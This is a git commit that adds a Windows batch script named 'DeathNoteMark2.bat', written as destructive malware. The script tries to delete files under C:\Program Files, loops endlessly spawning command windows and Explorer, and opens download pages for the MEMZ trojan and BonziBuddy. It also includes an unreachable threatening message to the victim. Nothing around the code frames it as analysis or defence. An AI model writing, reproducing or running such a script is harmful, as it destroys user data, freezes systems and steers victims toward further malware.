6073aa54041ed8e03653ebc7097f019b88c030ce
Kira <79051441+Kira-001@users.noreply.github.com>
2021-02-14 10:41:31 -0500

    Create DeathNoteMark2.bat

---
+++ DeathNoteMark2.bat
@@ -0,0 +1,10 @@
+@echo off
+del "C:\Program Files\"
+:A
+start
+explorer
+start www.memz-trojan.en.softonic.com/
+start www.bonzibuddy.org/download.html/
+goto :A
+echo Dear %username%,Yes i know who you are. You knew what you did was wrong now you will pay, This Code Will break your computer from the inside out like a parasite infecting a host, only this time the host is your computer and the parasite is me. you cant stop this, The reason behind this is because you commited a serious crime and this is your punishment. you knew this was gonna happen when you started This. i'm the creeper, catch me if you can - "11,9,18,1" >> creep.txt
+pause
